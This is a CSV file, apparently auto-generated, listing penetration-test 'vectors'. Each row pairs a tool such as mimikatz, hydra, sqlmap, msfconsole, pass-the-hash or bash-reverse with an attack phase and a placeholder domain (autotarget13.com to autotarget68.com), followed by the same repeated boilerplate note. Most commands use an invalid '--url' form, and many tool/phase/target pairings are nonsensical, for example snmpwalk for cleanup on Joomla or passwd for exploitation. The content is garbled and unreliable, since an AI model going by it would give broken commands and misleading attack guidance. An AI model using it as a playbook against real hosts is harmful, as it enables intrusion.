target_type,subtype,phase,tool,command,notes
WebApp,ASP.NET,Persistence,mimikatz.exe,mimikatz.exe --url http://autotarget13.com,"This vector uses mimikatz.exe during the persistence phase against a ASP.NET application. It targets http://autotarget13.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Privilege Escalation,config-leak,config-leak --url http://autotarget14.com,"This vector uses config-leak during the privilege escalation phase against a SNMP application. It targets http://autotarget14.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Scanning,wpscan,wpscan --url http://autotarget15.com,"This vector uses wpscan during the scanning phase against a PHP application. It targets http://autotarget15.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Scanning,ncrack,ncrack --url http://autotarget16.com,"This vector uses ncrack during the scanning phase against a Drupal application. It targets http://autotarget16.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Reconnaissance,hydra,hydra --url http://autotarget17.com,"This vector uses hydra during the reconnaissance phase against a Drupal application. It targets http://autotarget17.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Enumeration,del,del --url http://autotarget18.com,"This vector uses del during the enumeration phase against a Joomla application. It targets http://autotarget18.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Exploitation,passwd,passwd --url http://autotarget19.com,"This vector uses passwd during the exploitation phase against a SNMP application. It targets http://autotarget19.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Scanning,dnsrecon,dnsrecon --url http://autotarget20.com,"This vector uses dnsrecon during the scanning phase against a SMB application. It targets http://autotarget20.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Post Exploitation,sticky-keys,sticky-keys --url http://autotarget21.com,"This vector uses sticky-keys during the post exploitation phase against a General application. It targets http://autotarget21.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Enumeration,whatweb,whatweb --url http://autotarget22.com,"This vector uses whatweb during the enumeration phase against a ASP.NET application. It targets http://autotarget22.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Reconnaissance,proxychains,proxychains --url http://autotarget23.com,"This vector uses proxychains during the reconnaissance phase against a WordPress application. It targets http://autotarget23.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Post Exploitation,crontab,crontab --url http://autotarget24.com,"This vector uses crontab during the post exploitation phase against a FTP application. It targets http://autotarget24.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Scanning,gobuster,gobuster --url http://autotarget25.com,"This vector uses gobuster during the scanning phase against a WordPress application. It targets http://autotarget25.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Persistence,sublist3r,sublist3r --url http://autotarget26.com,"This vector uses sublist3r during the persistence phase against a FTP application. It targets http://autotarget26.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Exploitation,sublist3r,sublist3r --url http://autotarget27.com,"This vector uses sublist3r during the exploitation phase against a WordPress application. It targets http://autotarget27.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Cleanup,snmpwalk,snmpwalk --url http://autotarget28.com,"This vector uses snmpwalk during the cleanup phase against a Joomla application. It targets http://autotarget28.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Post Exploitation,ftp,ftp --url http://autotarget29.com,"This vector uses ftp during the post exploitation phase against a Magento application. It targets http://autotarget29.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Exploitation,sqlmap,sqlmap --url http://autotarget30.com,"This vector uses sqlmap during the exploitation phase against a Magento application. It targets http://autotarget30.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Scanning,find,find --url http://autotarget31.com,"This vector uses find during the scanning phase against a SMB application. It targets http://autotarget31.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Exploitation,laravel-expose,laravel-expose --url http://autotarget32.com,"This vector uses laravel-expose during the exploitation phase against a WordPress application. It targets http://autotarget32.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Enumeration,php artisan,php artisan --url http://autotarget33.com,"This vector uses php artisan during the enumeration phase against a Magento application. It targets http://autotarget33.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Exploitation,artisan-command,artisan-command --url http://autotarget34.com,"This vector uses artisan-command during the exploitation phase against a Laravel application. It targets http://autotarget34.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Enumeration,freerdp,freerdp --url http://autotarget35.com,"This vector uses freerdp during the enumeration phase against a Laravel application. It targets http://autotarget35.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Cleanup,bash-reverse,bash-reverse --url http://autotarget36.com,"This vector uses bash-reverse during the cleanup phase against a SNMP application. It targets http://autotarget36.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Persistence,mimikatz.exe,mimikatz.exe --url http://autotarget37.com,"This vector uses mimikatz.exe during the persistence phase against a PHP application. It targets http://autotarget37.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Post Exploitation,exploit-db,exploit-db --url http://autotarget38.com,"This vector uses exploit-db during the post exploitation phase against a Laravel application. It targets http://autotarget38.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Scanning,hydra,hydra --url http://autotarget39.com,"This vector uses hydra during the scanning phase against a Node.js application. It targets http://autotarget39.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Cleanup,exploit-db,exploit-db --url http://autotarget40.com,"This vector uses exploit-db during the cleanup phase against a FTP application. It targets http://autotarget40.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Cleanup,bashrc,bashrc --url http://autotarget41.com,"This vector uses bashrc during the cleanup phase against a FTP application. It targets http://autotarget41.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Post Exploitation,pass-the-hash,pass-the-hash --url http://autotarget42.com,"This vector uses pass-the-hash during the post exploitation phase against a Drupal application. It targets http://autotarget42.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Privilege Escalation,amass,amass --url http://autotarget43.com,"This vector uses amass during the privilege escalation phase against a ASP.NET application. It targets http://autotarget43.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Exploitation,arp-scan,arp-scan --url http://autotarget44.com,"This vector uses arp-scan during the exploitation phase against a ASP.NET application. It targets http://autotarget44.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Scanning,systemd,systemd --url http://autotarget45.com,"This vector uses systemd during the scanning phase against a FTP application. It targets http://autotarget45.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Reconnaissance,xss,xss --url http://autotarget46.com,"This vector uses xss during the reconnaissance phase against a Magento application. It targets http://autotarget46.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Enumeration,cronjob,cronjob --url http://autotarget47.com,"This vector uses cronjob during the enumeration phase against a RDP application. It targets http://autotarget47.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Scanning,restore-template,restore-template --url http://autotarget48.com,"This vector uses restore-template during the scanning phase against a ASP.NET application. It targets http://autotarget48.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Persistence,sqlmap,sqlmap --url http://autotarget49.com,"This vector uses sqlmap during the persistence phase against a SMB application. It targets http://autotarget49.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Cleanup,exploit-db,exploit-db --url http://autotarget50.com,"This vector uses exploit-db during the cleanup phase against a SNMP application. It targets http://autotarget50.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Cleanup,dnsrecon,dnsrecon --url http://autotarget51.com,"This vector uses dnsrecon during the cleanup phase against a FTP application. It targets http://autotarget51.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Persistence,config-leak,config-leak --url http://autotarget52.com,"This vector uses config-leak during the persistence phase against a Laravel application. It targets http://autotarget52.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Post Exploitation,magetool,magetool --url http://autotarget53.com,"This vector uses magetool during the post exploitation phase against a ASP.NET application. It targets http://autotarget53.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Reconnaissance,ftp,ftp --url http://autotarget54.com,"This vector uses ftp during the reconnaissance phase against a WordPress application. It targets http://autotarget54.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Persistence,sqlmap,sqlmap --url http://autotarget55.com,"This vector uses sqlmap during the persistence phase against a Laravel application. It targets http://autotarget55.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Reconnaissance,bashrc,bashrc --url http://autotarget56.com,"This vector uses bashrc during the reconnaissance phase against a Drupal application. It targets http://autotarget56.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Privilege Escalation,cronjob,cronjob --url http://autotarget57.com,"This vector uses cronjob during the privilege escalation phase against a RDP application. It targets http://autotarget57.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Cleanup,del,del --url http://autotarget58.com,"This vector uses del during the cleanup phase against a RDP application. It targets http://autotarget58.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Cleanup,config-tampering,config-tampering --url http://autotarget59.com,"This vector uses config-tampering during the cleanup phase against a SMB application. It targets http://autotarget59.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Reconnaissance,php artisan,php artisan --url http://autotarget60.com,"This vector uses php artisan during the reconnaissance phase against a FTP application. It targets http://autotarget60.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Privilege Escalation,at,at --url http://autotarget61.com,"This vector uses at during the privilege escalation phase against a Joomla application. It targets http://autotarget61.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Privilege Escalation,drupwn,drupwn --url http://autotarget62.com,"This vector uses drupwn during the privilege escalation phase against a Node.js application. It targets http://autotarget62.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Cleanup,cronjob,cronjob --url http://autotarget63.com,"This vector uses cronjob during the cleanup phase against a ASP.NET application. It targets http://autotarget63.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Exploitation,crackmapexec,crackmapexec --url http://autotarget64.com,"This vector uses crackmapexec during the exploitation phase against a Magento application. It targets http://autotarget64.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Scanning,wp-cli,wp-cli --url http://autotarget65.com,"This vector uses wp-cli during the scanning phase against a SNMP application. It targets http://autotarget65.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Scanning,artisan-command,artisan-command --url http://autotarget66.com,"This vector uses artisan-command during the scanning phase against a Node.js application. It targets http://autotarget66.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Exploitation,msfconsole,msfconsole --url http://autotarget67.com,"This vector uses msfconsole during the exploitation phase against a SMB application. It targets http://autotarget67.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Scanning,gobuster,gobuster --url http://autotarget68.com,"This vector uses gobuster during the scanning phase against a FTP application. It targets http://autotarget68.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
